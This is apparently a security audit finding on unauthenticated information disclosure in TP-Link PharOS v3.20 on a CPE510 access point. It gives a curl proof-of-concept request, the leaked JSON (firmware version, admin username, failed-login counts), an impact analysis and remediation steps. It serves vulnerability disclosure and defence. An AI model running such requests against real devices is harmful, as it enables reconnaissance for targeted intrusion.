# SEC-01: Unauthenticated System Information Disclosure

## Metadata Overview
- **Vulnerability ID:** SEC-01
- **Severity:** Medium (CVSS 5.3)
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Target Component:** TP-Link PharOS Web API (`/data/version.json`, `/data/sysmod.json`, `/data/configState.json`)
- **Affected Host:** `10.10.9.252` (CPE510, PharOS v3.20)

---

## Technical Description

The PharOS web server (`TP-LINK HTTPD/1.0`) exposes JSON API endpoints under the `/data/` route without enforcing session authentication or HTTP access cookies. Unauthenticated clients sending simple HTTP GET requests to `/data/version.json` receive a full JSON structure containing critical operational parameters of the access point.

### Empirical Evidence & Proof-of-Concept

```bash
curl -s http://10.10.9.252/data/version.json
```

**Output:**
```json
{
	"success": true,
	"timeout": true,
	"version": "1.00",
	"mode": "accessPoint",
	"status": 1,
	"failedCount": 1,
	"lockTime": 0,
	"ip": "192.168.1.33",
	"username": "admin",
	"firstLogin": false,
	"language": 0,
	"is2G": false,
	"devInfo": "CPE510",
	"devVer": "3.20",
	"isLockCountryID": false,
	"isRemoteLogin": false,
	"isWirelessAccess": false,
	"productInfo": "UN",
	"languageInfo": "en",
	"lockCountry": 0,
	"countryID": 356
}
```

---

## Security Impact

1. **Reconnaissance Facilitation:** An unauthenticated attacker on the local network can instantly determine exact device model (`CPE510`), firmware release (`3.20`), and internal IP configurations (`192.168.1.33`).
2. **Targeted Exploitation Prep:** Knowledge of the exact `devVer` allows precise selection of firmware-specific exploits.
3. **Brute-Force Monitoring:** The `failedCount` and `lockTime` parameters allow an attacker to observe whether brute-force attempts trigger active lockouts.

---

## Remediation

- Apply vendor firmware patch updating PharOS beyond v3.20.
- Ensure all endpoints under `/data/*.json` check for active HTTP session tokens prior to rendering system data.
